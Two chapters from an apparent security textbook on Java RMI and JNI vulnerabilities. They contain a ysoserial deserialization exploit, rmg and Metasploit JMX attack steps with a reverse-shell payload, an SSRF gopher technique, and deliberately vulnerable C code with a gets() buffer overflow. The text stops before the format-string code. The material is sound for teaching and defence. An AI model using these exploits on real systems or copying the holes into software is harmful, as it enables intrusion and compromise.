# [CHAPTER 13Java Remote Method Invocation Vulnerabilities](#contents.xhtml_ch13a)

[Introduction](#contents.xhtml_sc2_214a)

In cyber security, Java Remote Method Invocation (RMI) vulnerabilities are a significant concern, offering potential gateways for exploitation. This chapter will discuss the intricacies of RMI, exploring its basics, external server exploits, the exploitation of internal RMI servers via Server-Side Request Forgery (SSRF), and the exploitation of Java Management Extensions (JMX) over RMI. JMX is an API for managing and monitoring applications and services. As we navigate through step-by-step examples and in-depth coding guidance, we will unravel the vulnerabilities inherent in RMI, shedding light on the tools and techniques employed to exploit these weaknesses. Our journey encompasses the discovery of vulnerabilities on external servers, exploring SSRF, and culminating in a comprehensive understanding of secure coding practices to fortify against RMI vulnerabilities.

[Structure](#contents.xhtml_sc2_215a)

This chapter will discuss the remote method invocation vulnerabilities, including:

*   Remote Method Invocation basics
*   RMI Enumeration
*   RMI exploitation with RMG
*   Exploiting JMX over RMI with Metasploit
*   Server-Side Request Forgery and RMI

There will be step-by-step examples and thorough coding guidance.

[Objectives](#contents.xhtml_sc2_216a)

By the end of this chapter, you will understand RMI and how it can create a vulnerability. You will know how to find RMI services and exploit these on external servers. Then, you will learn about how a SSRF can control internal RMI servers remotely. To use these weaknesses, you will become familiar with standard tools such as remote-method-guesser (rmg). Rmg is a complete Java RMI tool that includes a vulnerability scanner and manual command line tools for RMI enumeration and exploitation. Finally, you will become familiar with secure code guidelines to prevent these issues.

[Remote Method Invocation basics](#contents.xhtml_sc2_217a)

RMI is a Java Application Programming Interface (API) that enables the invocation of methods on objects in a different Java Virtual Machine (JVM), allowing distributed communication between Java applications. RMI facilitates the seamless execution of methods across network boundaries, supplying a mechanism for invoking functions on remote objects as if they were local. The core idea is to extend the concept of method invocation to objects residing in different Java processes, promoting the development of distributed and interconnected Java applications.

While creating new custom implementations of RMI is relatively rare, RMI stays prevalent in many older Java applications. It also plays a crucial role in various Java connectors, such as Java Management Extensions (JMX) and Java Naming and Directory Interface (JNDI), showcasing its enduring significance in legacy and contemporary Java development. In the subsection entitled Exploiting JMX with Metasploit, we will look at using RMI to exploit JMX.

RMI is not well-known to penetration testers and is not considered a security issue. It can be exploited via serialization vulnerabilities or logic errors in the exposed service. The security is left to the developer, often resulting in a lack of encryption and authentication. This makes it easy for an attacker to reach the service. It is also easy for attackers to reverse engineer and discover the exposed services, which makes it easy to exploit via a deserialization vulnerability.

[Simple Java example](#contents.xhtml_sc3_218a)

In understanding Java RMI, developers use its capability to make Java objects available across a network. This process involves overcoming two key challenges: dispatching method calls and tracking resource allocation for remote clients. The RMI registry addresses the first challenge, supplying a centralized mechanism for method call dispatching. Meanwhile, the Distributed Garbage Collector (DGC) tackles the second challenge, efficiently managing resource allocation for remote clients.

Let us look at a simple Java code example to understand how RMI works. The first bit of code defines the interface being exposed via RMI:

import java.rmi.Remote;

import java.rmi.RemoteException;

import java.util.HashMap;

public interface MyRemoteInterface extends Remote {

String remoteHelloWorld() throws RemoteException;

String doStuff(String myString, HashMap myHashMap) throws RemoteException;

}

In the above code example, remoteHelloWorld is not vulnerable to deserialization attacks as it has no parameters, but the other method doStuff can be susceptible to deserialization attacks. All exposed methods with a non-string parameter can be vulnerable to deserialization attacks.

Let us look at a simple implementation of this interface in the following code:

import java.rmi.RemoteException;

import java.rmi.server.UnicastRemoteObject;

public class MyRemoteImplementation extends UnicastRemoteObject implements MyRemoteInterface {

protected MyRemoteImplementation() throws RemoteException {

super();

}

@Override

public String remoteHelloWorld() throws RemoteException {

return "Hello Remote World!";

}

@Override

public String doStuff(String myString, HashMap myHashMap) throws RemoteException {

return myString + “Do Something!”;

}

}

In the preceding code, the parameter myHashMap will cause a deserialization vulnerability if a vulnerable HashMap is passed to it, even though the parameter is not used in the code.

The following code sets up an RMI server that exposes these services:

// Server code.

import java.rmi.Naming;

import java.rmi.registry.LocateRegistry;

public class MyRemoteServer {

public static void main(String[] args) {

try {

// Create an instance of the remote implementation

MyRemoteInterface remoteObject = new MyRemoteImplementation();

// Create and export the RMI registry on port 1099

LocateRegistry.createRegistry(1099);

// Bind the remote object to the registry with the name "RemoteObject"

Naming.rebind("RemoteObject", remoteObject);

System.out.println("Server is ready...");

} catch (Exception e) {

e.printStackTrace();

}

}

}

Following is the client code, which shows how a client would call the exposed services:

import java.rmi.Naming;

import java.rmi.registry.LocateRegistry;

import java.rmi.registry.Registry;

public class MyRemoteClient {

private static final String REMOTEHOST = "10.0.100.10";

private static final String BOUNDNAME = "RemoteObject";

public static void main(String[] args) {

try {

// Look up the RMI Resistry by Server IP

Registry registry = LocateRegistry.getRegistry(REMOTEHOST);

// Look up the remote object by name

MyRemoteInterface remoteObject = (MyRemoteInterface) registry.lookup(BOUNDNAME);

// Invoke the remote method -- remoteHelloWorld

String hello_result = remoteObject.remoteHelloWorld();

// Invoke remote method – doStuff

String stuff_result = remoteObject.doStuff(hello_result, null);

System.out.println("Response from server: " + hello_result + “ “ + stuff_result);

} catch (Exception e) {

e.printStackTrace();

}

}

}

The remote client code looks up the remote object by its name and the RMI server’s IP address and calls the remote object’s exposed method.

In the following subsection, we will look at creating a manual proof of concept exploit for this simple RMI example.

[Manual exploitation](#contents.xhtml_sc3_219a)

The client code is a good starting place for writing your own RMI exploitation when available. As previously mentioned, there are two exploitation scenarios: deserialization and business logic vulnerabilities. To write a deserialization exploit, we need the server information, an exposed method with a parameter, the interface, and a gadget chain.

If we are writing logic exploitation, we need the server information, the method or methods we use, the interface, and a deep understanding of what the methods do. For example, any security enforced in the client code can be bypassed, such as input validations, sanitizations, authentication checks, authorization checks, or sequential process flows. If we had two methods that should be called in order and the second returns confidential information, whether or not we are authorized to call the second method, in writing our client, it would be easy to change this.

The following example shows how to write a manual exploit that uses deserialization with the CommonsCollection3 gadget:

import java.rmi.Naming;

import java.rmi.registry.LocateRegistry;

import java.rmi.registry.Registry;

import ysoserial.payloads.CommonsCollections3;

public class MyRemoteExploit {

private static final String REMOTEHOST = "10.0.100.10";

private static final String BOUNDNAME = "RemoteObject";

public static void main(String[] args) {

try {

// Look up the RMI Resistry by Server IP

Registry registry = LocateRegistry.getRegistry(REMOTEHOST);

// Look up the remote object by name

MyRemoteInterface remoteObject = (MyRemoteInterface) registry.lookup(BOUNDNAME);

// Invoke the remote method -- remoteHelloWorld

String hello_result = remoteObject.remoteHelloWorld();

// Create payload

Object payload = new CommonsCollections3().getObject("touch /tmp/serial");

// Invoke remote method – doStuff

String stuff_result = remoteObject.doStuff(hello_result, payload);

System.out.println("Response from server: " + hello_result + “ “ + stuff_result);

} catch (Exception e) {

e.printStackTrace();

}

}

}

We needed a lot of information to create this exploit, and we may not always have all of this information. In the next section, we will look at RMI Enumeration and different techniques and tools that can be used to get the information we used here.

[RMI Enumeration](#contents.xhtml_sc2_220a)

Java RMI relies on specific ports for its activation system and registry functionalities. The default ports, including 1090, 1098, 1099, 1199, and ranges 4443-4446, 8999-9010, and 9999, are crucial for facilitating communication and resource allocation within the Java RMI framework. Notably, remote objects themselves are often bound to random ports. Nmap may face challenges finding Transport Layer Security (TLS) RMI services, but it can work well to find the registry and RMI details when no TLS is used.

If we run Nmap on our local example’s registry, we would get back the following information:

![](images/Figure_13.1.png)

Figure 13.1: Nmap RMI results

Nmap can help us find any RMI registries and ports. Nmap can also help find where the methods are exposed and any interface names.

In cases where the code is part of an open-source project, information about the interface, implementation, and dependencies can be found in the online repository. If we run the client ourselves, we can decompile it using techniques shown in [Chapter 15](#ch15.xhtml), Static Analysis of Java Android Applications. Then, the decompiled code can be used to check the interface, implementation, and dependency list.

Java has one native gadget chain that lets us use outbound Domain Name System (DNS) connections. This is part of Ysoserial and is called the URLDNS gadget. It does not give us Remote Code Execution (RCE), so we should look for another gadget chain to get a complete compromise. This gadget chain can be figured out via the dependency list, or we can use Gadget Inspector. Gadget Inspector can be downloaded from [https://github.com/JackOfMostTrades/gadgetinspector](https://github.com/JackOfMostTrades/gadgetinspector).

Gadget Inspector runs on the command line and takes a Java application as an argument. Gadget Inspector is a very memory-intensive tool. A sample command would look like

java -Xmx2G -jar build/libs/gadget-inspector-all.jar ApplicationToTest.jar

Gadget Inspector creates a file called gadget-chains.txt, which contains the analysis.

In the next section, we will examine another tool that can help find RMI information, the rmg.

[Remote Method Guesser](#contents.xhtml_sc3_221a)

The three default components of Java RMI, namely the RMI registry, activation system, and, DGC form the backbone of the RMI infrastructure. Despite their fundamental roles, these components have been recognized as potential attack vectors for quite some time. The intricacies of RMI, including its port configurations and underlying components, underscore the importance of securing these aspects to fortify against potential vulnerabilities in Java RMI applications.

We can gather information using the rmg tool available for download on GitHub at the following URL: [https://github.com/qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser). This tool is a maven package that can be downloaded and compiled from the command line inside the downloaded directory with the command:

mvn package

There are also prebuilt versions available for the GitHub releases page, as follows:

![](images/Figure_13.2.png)

Figure 13.2: Download rmg jar

This project has three vulnerable RMI servers in the github docker container registry that you can use to practice this exploitation. To perform deserialization attacks through this tool, specify the path to Ysoserial in the config file or the command line with the switch:

--yso /path/to/Ysoserial.jar

Two methods in rmg can help with enumeration. As this is a jar file, it will run on all operating systems, assuming Java is installed. The help will show you the basic option using the command:

java -jar rmg.jar -h

Refer to the following figure:

![](images/Figure_13.3.png)

Figure 13.3: Remote Method Guesser help

The two methods function as scanners to help us find vulnerabilities. As shown above, those two methods are the enum and scan options. The scan option does a port scan of standard RMI ports looking for well-known services such as Tomcat or JBoss. The enum method takes the IP and the port of a known RMI service and enumerates as much data as possible. For the following scanning examples, JMX was turned on in the Tomcat installation using port 9999 for the registry. First, let us use the scan method to check several ports. This is done with the command:

rmg scan ip --ports 1-100 1000-1100 2300-2350 9900-9999

Refer to the following figure:

![](images/Figure_13.4.png)

Figure 13.4: RMI scan method

This example does not find our open JMX server running RMI because it looks for only well-known examples that match exactly. This is why we do not want to depend on this feature. It is best practice to use Nmap to find RMI services.

As we know the port of the RMI registry, let us try the enum method and see what we can find. The command to run the enum is:

rmg enum 127.0.0.1 9999

The output is as follows:

![](images/Figure_13.5.png)

Figure 13.5: RMI enum method

This information tells us much about what may or may not be an RMI vulnerability in the service. It would be best to run rmg enum anytime you encounter an RMI service during your penetration test. In [Figure 13.5](#ch13.xhtml_fig13-5), the first section of RMI registry bound names shows a list of enumerated bound names. Each bound name has the class name and, in parenthesis, whether this is a known class or not. If the class is marked as known, then we can use the rmg command known to get more detailed information, as follows:

![](images/Figure_13.6.png)

Figure 13.6: RMG known command

The information includes any known vulnerabilities that we can take advantage of.

The following subsection will look at the commands we can use to verify vulnerabilities and exploit weaknesses in these scans.

[RMI exploitation with RMG](#contents.xhtml_sc2_222a)

This section explores several commands in RMG that help verify and perform exploitation.

The first command we will look at is the guess command, which tries to find existing remote methods. It uses a wordlist with the method definitions and sends the corresponding method hashes to the remote server to verify existence, as follows:

![](images/Figure_13.7.png)

Figure 13.7: RMG guess command

Default wordlists are included in the jar of RMG. We can use the wordlist of our choice by changing the configuration file or the --wordlist-file or --wordlist-folder flags. All methods with zero arguments are skipped unless we enable this by using the zero-argument flag: --zero-arg. They are skipped because they would result in actual method calls on the server, which may be undesirable.

The following command is call, which invokes remote methods without writing Java code. You may wish to execute a procedure as part of your testing for logic vulnerabilities. For example, consider a method String getAccountInfo(String accountNum) on the remote server with bound name account-server. This method sounds as if it might allow unauthorized access, and we may want to invoke it using a regular Java RMI call to check. This can be done as follows:

![](images/Figure_13.8.png)

Figure 13.8: Call method using RMG

After the command call is the RMI service’s IP address and port number, followed by the input to the function. Then, the --signature flag is used to indicate the signature of the function being called in single quotes. The last item is the flag --bound-name, which is used to indicate the name of the remote object on which the function will be called. The parameter value is in single quotes and double quotes. This is required for String values. Notice that calling remote methods does not create any output by default. To process output generated by the call action, we can use the default generic print plugin via the flag --generic-print, as follows:

![](images/Figure_13.9.png)

Figure 13.9: RMG call method with print options

If you need to do something more complicated, you can register a ResponseHandler to do precisely what is required.

Now, let us look at how to use the command serial to do a deserialization exploit with RMG. Using the serial command to attack the registry, garbage collection, or activator is possible, but modern RMI instances automatically filter deserialization attacks, so that is unlikely to succeed.

This example will instead look at how to perform this attack on the function doStuff based on our original example in this chapter. An example of how to call the RMI function doStuff is as follows:

![](images/Figure_13.10.png)

Figure 13.10: RMG serial command

Similar to the call command, the --signature flag and the --bound-name flag represent the function signature and the name of the remote object that exposes the function. After the registry’s IP address and port is the gadget chain from Ysoserial. This is followed by the command for the gadget chain to perform. To verify if it works on the attacking machine, we must set up a Netcat listener and wait for this to be triggered, as shown in the following figure:

![](images/Figure_13.11.png)

Figure 13.11: RMG serial attacker machine

The following section will look at exploiting the JMX RMI issue using Metasploit.

[Exploiting JMX over RMI with Metasploit](#contents.xhtml_sc2_223a)

JMX is a Java technology that provides a standard way of managing and monitoring Java applications, system objects, devices, and service-oriented networks. JMX allows developers to expose managed Java objects as Managed Beans (MBeans), making monitoring and controlling Java applications remotely possible. This is particularly useful in distributed systems, where the management and monitoring of components are essential. JMX provides a powerful mechanism for remotely monitoring and managing Java applications through MBeans. MBeans expose attributes and methods that can be accessed and invoked from a remote system, allowing comprehensive management capabilities.

To manage applications via JMX, developers typically define MBeans associated with specific functionalities within an application. These MBeans act as management interfaces, offering insights into application metrics and control over various aspects. Accessing these MBeans is convenient through tools like jconsole, a monitoring and management console included in the Java Development Kit (JDK). JMX over RMI will set up an RMI connector and use RMI to transmit client requests to a remote MBean server.

To add JMX to any Java application, start the application with the following switches:

-Dcom.sun.management.jmxremote.port=2323

-Dcom.sun.management.jmxremote.authenticate=false

-Dcom.sun.management.jmxremote.ssl=false

Establishing a connection to the MBean server is essential for remote management. Java provides a remote JMX connector based on Java RMI. The port we specified is the port of the RMI naming registry. A connection can be established to the RMI naming registry, which exposes an object named jmxrmi. The actual RMI service operates on a random Transmission Control Protocol (TCP) port.

During a black box penetration test, nmap scans proved invaluable in finding JMX servers. The TCP port associated with the RMI naming registry and the exposed RMI services can be found by conducting a port scan on the remote system. This information allows penetration testers and security professionals to locate and test JMX services.

Upon discovering a JMX server, Metasploit offers a versatile exploit for Java JMX servers. The exploit located at exploit/multi/misc/java_jmx_server, is a general-purpose tool for exploiting vulnerabilities in Java JMX services. If you forget the path, search for key terms on Metasploit to get a list of possible exploits and scanners, as follows:

![](images/Figure_13.12.png)

Figure 13.12: Metasploit search for JMX exploits

Configuring and using this exploit can provide unauthorized access and control over the target system. Refer to the following figure:

![](images/Figure_13.13.png)

Figure 13.13: Metasploit configuration

When we type show options, a list of options that can be set for the module and payload are listed. The setup, including option values and descriptions for the options, is shown above. If the required column says yes, then that option must have a value. Some values are automatically filled in with a default value. For example, the JMXRMI option, which is the name of the bound JMX RMI interface, is set by default to jmxrmi, and generally does not need to be changed. Certain options need to be checked every time. These include RHOSTS, RPORT, LHOSTS, and LPORT. The RHOSTS and RPORT are referring to the remote host or hosts. These specifiy the IP or IP range and port to send the attack. The LHOST and LPORT are your local machine. This is the information that is included in the payload to get your interpreter session. The LHOST is your IP address, and LPORT is an available port you can use for your meterpreter session. A specific payload also has to be set every time. This example uses the /java/meterpreter/reverse_tcp payload after completing the setup of the option type run to get a meterpreter session.

The following section will provide general SSRF information and specific information about using SSRF to exploit RMI vulnerabilities.

[Server-Side Request Forgery and RMI](#contents.xhtml_sc2_224a)

SSRFs allow unauthorized access, data exposure, or remote code execution on a server by manipulating the server into making unintended requests to internal resources or external systems through user-supplied input without proper validation or restrictions. SSRF has been previously discussed in the section on XXEs in [Chapter 7](#ch07.xhtml), Exploring Vectors with DoS Attack, and Chapter 11: Authorization Practices. This section will give specific guidance on RMI exploitation via SSRF, including an example using rmg.

Java RMI allows local objects to consume remote services, creating the impression of a strong connection between the two. However, it is important to note that the RMI protocol is stateless, like HTTP. While there is a loose coupling between local objects and remote services, this can leave the door open for SSRF attacks.

To connect to a remote object, clients usually need a certain amount of information, including the IP address and TCP port of the remote object, the class or interface implemented by the remote object, and the ObjID value of the remote object. All this information is stored within the RMI registry, a naming service that makes RMI services available on the network. The RMI registry is also a remote object. Unlike the RemoteService remote object, it is a well-known remote object with its implemented class and assigned ObjID fixed and known by RMI clients, making it an easier target for SSRF attacks.

The Java RMI protocol consists of a handshake, during which static data and information on the server and client host are exchanged, and one or more method calls. From an SSRF perspective, the handshake part of the RMI protocol looks problematic. SSRF vulnerabilities usually only allow a one-shot attack, and interactive communication like a handshake is impossible. However, the RMI server reads data from the underlying TCP stream individually, allowing the client to send all required data right at the beginning without waiting for any server responses. To perform SSRF attacks on RMI services, you need to be able to send arbitrary bytes, especially null bytes, to the target RMI service.

Java RMI is a communication protocol that allows Java programs to invoke methods remotely and is widely used to build distributed systems. Java RMI has three protocol variants: Stream, Single Operation, and Multiplex. While the Multiplex protocol is no longer supported, Stream and Single Operation protocols are supported on all RMI endpoints. Single Operation Protocol only allows a single RMI call per connection and is the preferred choice when performing SSRF attacks. However, the problem with this protocol is that it lacks client-side support within default Java RMI implementations.

Performing SSRF attacks on Java RMI requires the client to know all data that needs to be sent to the RMI server in advance. This is possible for well-known RMI services with a fixed ObjID value, such as the RMI registry, the activation system, or the DGC. However, other remote objects get a random ObjID assigned when bound to a TCP port and guessing an ObjID is impossible. Therefore, RMI clients must talk to an RMI registry before using the RMI service.

[SSRF RMI examples](#contents.xhtml_sc3_225a)

In this section, we will explore the SSRF vulnerability in the Java RMI protocol using the RMG introduced earlier in this chapter.

The first step is to identify our SSRF. The most straightforward case is when the SSRF is found in a GET parameter. However, this is still easily doable if the SSRF location is a POST parameter or a header. We can use curl to send these via the command line or Burp Suite repeater to send these commands.

We will assume that the RMI registry is on the server with a SSRF and is using a well-known port. We can use the IP address 127.0.0.1 to call the RMI server.

Using RMG will become a 3-step process. Also, note that each RMI command can only perform one action. Some RMG commands, such as enum, perform a lot of tests. Luckily, there are ways to specify one specific test in each command.

The basic process is as follows:

1.  Use rmg with a single command and the --ssrf flag to indicate that you want rmg to create input for your SSRF. You will most likely also need the --gopher flag and the --encode flag, which tells rmg the the gopher format should be used and the payload should be URL encoded.
2.  Then, send the payload in the HTTP request using Burp Suite repeater or CURL.
3.  Finally, use rmg with the same command as in 1, except remove the --ssrf, --gopher, and --encode flags, and insert the --ssrf-response flag followed by the output from the SSRF.

Now, we will perform an example using this technique. We will use the enum command to get a list of bound names.

Let us assume we have discovered an SSRF on the following URL: http://:192.168.56.1:9181?file=myfile. The file parameter can take an HTTP URL and call localhost. We can use rmg with the ssrf flag to create a payload to enumerate bound names, as follows:

![](images/Figure_13.14.png)

Figure 13.14: Enum Bound Names via SSRF

After the enum command, we use the registry's local network IP and port. Then, we use the flag --scan-action with the value list. This says to only run the one list command on enumeration. Then, we add the flags for getting the SSRF payload --ssrf --gopher --encode. We received the payload and now call the URL with curl using that payload, as shown in the following figure:

![](images/Figure_13.15.png)

Figure 13.15: Use SSRF payload from RMG

Now, we can take the result from the SSRF and send it to RMG for decoding, as follows:

![](images/Figure_13.16.png)

Figure 13.16: Decode the result using RMG

Other commands can be done similarly. To use the enum command to get a further listing from a bound name, add the flag --bound-name with a name found in the previous example.

The command would look like:

rmg enum 127.0.0.1 9999 --scan-action list --bound-name account-server --ssrf

--gopher –encode

In the next section, we will learn secure coding guidelines for RMI.

[Secure coding guidance for RMI](#contents.xhtml_sc3_226a)

To secure RMI, it is essential to use the latest Java version to avoid any potential vulnerabilities that may exist in older versions. Additionally, enabling TLS protection on RMI communications is necessary as the underlying protocol transmits data in plain text. Implementing user authentication is also recommended. Authentication and authorization should be checked with every call to the RMI service. Finally, it is essential to use deserialization filters and ensure that no applications or third-party libraries perform hazardous actions during deserialization.

[Conclusion](#contents.xhtml_sc2_227a)

This chapter provided a comprehensive understanding of Java RMI vulnerabilities, including the basics, manual exploits, enumeration, and exploiting internal RMI servers via SSRF. We have learned how to recognize and mitigate these vulnerabilities through practical examples and coding guidance. By incorporating these measures, we can proactively safeguard against RMI vulnerabilities and SSRF challenges in Java application security.

In the next chapter, we will look at JNI vulnerabilities.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 14Java Native Interface Vulnerabilities](#contents.xhtml_ch14a)

[Introduction](#contents.xhtml_sc2_228a)

Java Native Interface (JNI) is a powerful bridge between Java and native code, enabling seamless integration of Java applications with code written in languages like C and C++. However, this chapter explores the darker side of JNI, uncovering vulnerabilities that can compromise the security of Java applications. As we explore the fundamentals of JNI, the focus will extend beyond its constructive uses to examine potential exploitation avenues. Prepare to navigate through the complexities of these vulnerabilities, armed with practical examples and comprehensive coding guidance.

[Structure](#contents.xhtml_sc2_229a)

This chapter will discuss JNI vulnerabilities and memory corruption in Java:

*   Java Native Interface basics
*   JNI vulnerabilities and exploitation
*   Securing JNI implementations

There will be step-by-step examples and thorough coding guidance.

[Objectives](#contents.xhtml_sc2_230a)

By the end of this chapter, you will understand JNI and how it can create a vulnerability. You will know how to recognize and exploit these vulnerabilities. You will learn about two forms of memory corruption that can happen with JNI: buffer overflows and format string vulnerabilities. Finally, you will become familiar with secure code guidelines to prevent these issues.

[Java Native Interface basics](#contents.xhtml_sc2_231a)

JNI is a Java mechanism that enables integrating native applications written in languages like C and C++ with Java code. These native methods are typically defined in a shared library file, such as a .dll, .so, or .dylib file, and are connected to a Java method definition using the native keyword. This allows Java programs to access and use functionality not available natively in Java, making it a powerful tool for developers. In essence, JNI provides a bridge that enables Java applications to leverage the capabilities of native libraries, promoting a harmonious coexistence between the platform-independent nature of Java and the system-level functionalities often implemented in native code. JNI also allows programmers to write one version of a native application or library and expect it to work with all JVMs that support JNI, enabling these Java programs to tap into the power and efficiency of low-level languages while maintaining their cross-platform compatibility.

The following is a simple example demonstrating the usage of JNI with an introductory Java class and the corresponding C code. This example performs a simple addition operation using JNI and walks through creating and using a JNI-based library. The Java source is compiled into class files using Javac, and native headers are made using the -h flag while compiling. These headers are included in the implementation source code and compiled and linked to a platform-dependent shared library using a C/C++ compiler. A Java class contains native methods that load the shared JNI library.

Refer to the Java code showing how to call a JNI library:

public class Sum {

static {

// Load the JNI library

System.loadLibrary("SumLibrary");

}

// Native method declaration

public native int addNumbers(int a, int b);

public static void main(String[] args) {

Sum sum = new Sum();

int result = sum.addNumbers(5, 7);

System.out.println("Sum: " + result);

}

}

Then, this code is compiled using Javac from the command line, as follows:

![](images/Figure_14.1.png)

Figure 14.1: Compiling the JNI code and creating the header file

The -h flag tells Javac to create the headers and requires a parameter indicating the directory to store the header file. The contents of the created header file are shown as follows:

/* DO NOT EDIT THIS FILE - it is machine generated */

#include <jni.h>

/* Header for class Sum */

#ifndef _Included_Sum

#define _Included_Sum

#ifdef __cplusplus

extern "C" {

#endif

/*

* Class: Sum

* Method: addNumbers

* Signature: (II)I

*/

JNIEXPORT jint JNICALL Java_Sum_addNumbers

(JNIEnv *, jobject, jint, jint);

#ifdef __cplusplus

}

#endif

#endif

The following code is the C code that makes up the library called via JNI:

#include <stdio.h>

#include “Sum.h”

JNIEXPORT jint JNICALL Java_Sum_addNumbers(JNIEnv *env, jobject obj, jint a, jint b) {

return a + b;

}

On Linux, the C code is compiled to create a .so library, while on Windows, the C code is compiled into a dynamic link library (DLL) file. On Linux, the library files should all start with the prefix lib. The library name on Linux is libSumLibrary, and on Windows, the library name is SumLibrary.dll. Gcc is the compiler of choice for C and is included in all standard Linux distributions. If you need to download a Windows version of gcc, you can find one at https://winlibs.com/#download-release.

The command for Linux is gcc -shared -o libSumLibrary.so -I"${JAVA_HOME}/include" -I"${JAVA_HOME}/include/linux" sum.c.

Make sure to replace ${JAVA_HOME} with the actual path to your Java installation.

On Windows, this would become: gcc -shared -o SumLibrary.dll -I"%JAVA_HOME%\include" -I"%JAVA_HOME%\include\win32" sum. c.

An example of compiling the library is shown in the following figure:

![](images/Figure_14.2.png)

Figure 14.2: Compiling the shared JNI library

Then, the code is run from the command line using your Java installation with the command Java Sum. The running program is shown as follows:

![](images/Figure_14.3.png)

Figure 14.3: Running the JNI code

The following section will show how JNI can introduce vulnerabilities into your Java application.

[JNI vulnerabilities and exploitation](#contents.xhtml_sc2_232a)

While JNI provides a valuable means for Java applications to interoperate with native code, its integration can introduce potential security vulnerabilities if not handled cautiously. The direct interaction between Java and native languages creates a boundary where memory management differences, type mismatches, and other low-level intricacies may lead to unintended consequences. Inadequate input validation, improper handling of pointers, and memory leaks within the native code can become exploitable vulnerabilities. Additionally, exposing sensitive functionalities through JNI interfaces without proper access controls can compromise the overall security of the Java application. This section will look at two exploitable examples of JNI code. Each has a class C vulnerability that can now be exploited in Java because of JNI.

[Buffer overflows](#contents.xhtml_sc3_233a)

The first example looks at a classic buffer overflow. Buffer overflows in C occur when a program writes more data into a buffer (an allocated region of memory) than it can hold, leading to the overflow of adjacent memory locations. This can result in the corruption of critical data, manipulation of program execution, or even the execution of arbitrary code by attackers.

Certain C functions, such as gets, are particularly prone to buffer overflows because they do not perform bounds checking on input. The gets function reads characters from standard input until a newline character is encountered. It stores them in the provided buffer, making it susceptible to overflows if the input exceeds capacity. Similarly, other functions like strcpy and sprintf can be dangerous if not used carefully, as they may not check the length of the input data against the size of the destination buffer, potentially leading to buffer overflows.

Buffer overflows encompass both heap and stack overflows, where the stack and heap represent different regions of a program's memory. Stack overflows occur when a buffer allocated on the program's stack is overrun, potentially affecting the return address and control flow. On the other hand, heap overflows happen when a buffer allocated in the heap, dynamically managed memory, is overflowed, leading to potential corruption of critical data structures. The following example is a stack overflow vulnerability.

The Java code for the stack overflow vulnerability example is given as follows. This example checks if a user-entered secret matches the stored value. It is contrived to allow a stack overflow and the user to perform exploitation without understanding the full set of exploitation steps.

public class Secret {

static {

// Load the JNI library

System.loadLibrary("SecretLibrary");

}

// Native method declaration

public native boolean checkSecret();

public static void main(String[] args) {

Secret secret = new Secret();

if (secret.checkSecret()) {

System.out.println("You found the secret!");

System.out.println("GREAT JOB!");

} else {

System.out.println("**That's not it!");

System.out.println("Try again later.");

}

}

}

Next, compile the code using Javac, as shown in the given figure:

![](images/Figure_14.4.png)

Figure 14.4: Compiling the Java JNI stack overflow example

The header file was generated, and the Java class was created. Next, look at the following C code:

#include <string.h>

#include <stdio.h>

#include "Secret.h"

JNIEXPORT jboolean JNICALL Java_Secret_checkSecret(JNIEnv *env, jobject obj) {

int isMatch = 0;

char secret_buffer[16];

printf("Enter what you think the secret is=>");

gets(secret_buffer);

printf(isMatch==0?"No\n":"Yes\n");

if (strcmp(secret_buffer, "PKSDACVG") == 0) {

isMatch = 1;

}

return (isMatch != 0);

}

This is compiled into a library called SecretLibrary.dll, as shown in the following figure:

![](images/Figure_14.5.png)

Figure 14.5: Compiling C library with buffer overflow

Now, we are ready to run the Java class from the command line, shown as follows:

![](images/Figure_14.6.png)

Figure 14.6: Testing input within buffer size

While checking the source code, we see that the buffer has a size of 16\. Generally, when we suspect a buffer overflow, we try increasing larger sizes until we get a fatal error or segmentation fault. In this example, the fatal error happens at input size 31 for this JVM and OS, as shown in the following figure:

![](images/Figure_14.7.png)

Figure 14.7: Stack overflow - Fatal error

The crash happens when you overwrite the whole or part of the next instruction pointer to an invalid address. In most cases, after finding the buffer overflow, we would figure out what address to write over the next instruction pointer. There are various tools like debuggers and memory tools to look at what is overwritten and find instruction pointers or the location of a jump instruction that we want to use. We need a payload after putting together the overflow with the memory address. This can be generated from a tool like msfvenom or handwritten and compiled. After the shell code is ready, add some No Operation (NOP) between the instruction address and the shell code. Then, use this input with the vulnerable application. For more information on the general buffer overflow exploitation steps, please refer to: [https://www.hackingarticles.in/a-beginners-guide-to-buffer-overflow/](https://www.hackingarticles.in/a-beginners-guide-to-buffer-overflow/).

In the stack overflow example, we can use the overflow to bypass the secret matching. The function checkSecret has two variables put on the stack. The first is an integer called isMatch, which stores whether the user-entered data matches the held secret. Then, the buffer of size 16 is pushed onto the stack on top of isMatch. When we overflow the buffer, we can overflow the value of isMatch and change the program's control flow.

We want isMatch to be anything except zero. To find the correct input, we can try increasing the input's size incrementally until we bypass the check. In the following example, we see that it took 28 A’s to change the value of isMatch and change the control flow:

![](images/Figure_14.8.png)

Figure 14.8: Use the buffer overflow to change the control flow

[Format string vulnerabilities](#contents.xhtml_sc3_234a)

The following example looks at format string vulnerabilities. Format string vulnerabilities in C occur when user-controlled input is directly passed as a format string parameter to functions like printf or sprintf without proper validation. These vulnerabilities can lead to serious security risks as attackers exploit the format specifiers to read or write arbitrary memory locations, potentially causing unauthorized access, information disclosure, or code execution.

Payloads for format string vulnerabilities often involve malicious format specifiers like %n or %s. The %n specifier can be used to write the number of characters printed so far to a specified memory location, allowing attackers to manipulate program variables or data structures. The %s specifier is assumed to be a pointer to a string. When used, %s will read a character string from processor memory (at the location indicated on the stack), stopping at the first null character. Thus, there will be an invalid address soon, which can lead to buffer overflows and memory corruption.

The Java code for the format string vulnerability example is as follows:

public class Game {

static {

// Load the JNI library

System.loadLibrary("GameLibrary");

}

// Native method declaration

public native void playGame(String win);

public static void main(String[] args) {

Game game = new Game();

String s1 = "I am lucky";

String s2 = "I am %d not %p lucky %x";

if (args.length <= 0) {

System.out.println("\n\n* Submit your own tests on the command line as parameters.\nHere are a few example strings running.\n");

System.out.println("* Game 1: " + s1);

game.playGame(s1);

System.out.println("* Game 2: " + s2);

game.playGame(s2);

}

for (int i=0; i<args.length; i++) {

int gameNum = i+1;

System.out.println("* Game " + gameNum + ": " + args[i]);

game.playGame(args[i]);

}

}

}

This code is compiled with the -h flag to create the header file, as follows:

![](images/Figure_14.9.png)

Figure 14.9: Compile vulnerable code

The vulnerable C code is shown as follows:

#include <stdio.h>

#include "Game.h"

